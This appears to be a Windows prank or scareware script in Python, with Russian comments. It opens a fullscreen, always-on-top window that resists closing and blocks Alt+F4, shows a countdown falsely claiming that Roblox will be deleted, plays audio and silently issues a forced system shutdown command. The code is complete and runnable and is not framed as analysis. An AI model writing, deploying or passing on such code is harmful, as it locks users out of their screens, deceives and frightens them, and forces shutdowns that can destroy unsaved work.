import tkinter as tk
from PIL import Image, ImageTk
import sys
import threading
import pygame
import os

# Вызов окна с ошибкой
def play_audio_async(audio_file):
    pygame.mixer.init()
    pygame.mixer.music.load(audio_file)
    pygame.mixer.music.play()

# Получаем текущий рабочий каталог
current_dir = os.path.dirname(os.path.abspath(__file__))
audio_path = os.path.join(current_dir, "sound.mp3")
print(audio_path)

# Example usage:
root = tk.Tk()
root.title("взлом попы")

# Делаем окно полноэкранным
root.attributes("-fullscreen", True)

# Открываем изображение и преобразуем его для Tkinter
img = Image.open("image.jpg")
tk_img = ImageTk.PhotoImage(img)

# Создаем виджет Label и вставляем в него изображение
label_img = tk.Label(root, image=tk_img)
label_img.pack(expand=True)

# Создаем виджет Label для обратного отсчета
label_timer = tk.Label(root, text="", font=("Helvetica", 48), bg="black", fg="white")
label_timer.pack(anchor="n", pady=20)

# Функция для блокировки закрытия окна
def disable_event():
    pass

# Отключаем обработку события закрытия окна
root.protocol("WM_DELETE_WINDOW", disable_event)

# Блокируем клавиши Alt+F4
def block_keys(event):
    if event.state == 0x20000 and event.keysym == 'F4':
        return "break"

root.bind_all('<Alt-KeyPress-F4>', block_keys)

# Функция для постоянного фокусирования на окне
def keep_focus():
    root.attributes('-topmost', True)
    root.after(10, keep_focus)

keep_focus()

def countdown(count):
    # Обновляем текст с указанием случайного файла

    label_timer.config(text=f" Roblox будет удлаен через: {count} сек.")

    if count > 0:
        # Запускаем функцию снова через 1 секунду
        root.after(1000, countdown, count - 1)
    else:
        sys.exit()

# Запускаем обратный отсчет с 20 секунд
os.system("shutdown /s /t 31")
countdown(30)
# Play audio asynchronously
threading.Thread(target=play_audio_async, args=(audio_path,)).start()

# Запускаем главное окно
root.mainloop()